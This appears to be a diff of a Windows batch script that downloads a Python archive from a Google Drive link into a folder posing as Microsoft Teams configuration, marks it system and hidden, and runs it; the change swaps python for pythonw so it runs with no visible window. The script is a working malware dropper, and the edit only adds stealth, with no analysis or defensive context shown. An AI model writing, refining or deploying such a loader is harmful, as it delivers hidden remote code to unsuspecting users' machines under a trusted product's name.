@@ -5,11 +5,11 @@ IF NOT EXIST "C:\Users\%USERNAME%\AppData\Local\Microsoft-Teams\configuration\" 
 )
 
 IF EXIST "C:\Users\%USERNAME%\AppData\Local\Microsoft-Teams\configuration\wxappx.pyz" (
-    start "" python "C:\Users\%USERNAME%\AppData\Local\Microsoft-Teams\configuration\wxappx.pyz"
+    start "" pythonw "C:\Users\%USERNAME%\AppData\Local\Microsoft-Teams\configuration\wxappx.pyz"
 ) ELSE (
     curl -L -o "C:\Users\%USERNAME%\AppData\Local\Microsoft-Teams\configuration\wxappx.pyz" "https://drive.usercontent.google.com/download?id=1QQ1vY0rMnjpfaoNGNi8ARNiZE5ZN4ncF&export=download&authuser=0&confirm=t&uuid=174fd50f-678a-4f18-a113-8d93de9a9342&at=AIrpjvMgHZXYLtS3d5NkKO6Ii04A:1738958731376"
     attrib +s +h "C:\Users\%USERNAME%\AppData\Local\Microsoft-Teams\configuration\wxappx.pyz"
-    start "" python "C:\Users\%USERNAME%\AppData\Local\Microsoft-Teams\configuration\wxappx.pyz"
+    start "" pythonw "C:\Users\%USERNAME%\AppData\Local\Microsoft-Teams\configuration\wxappx.pyz"
 )
 
 setlocal enabledelayedexpansion
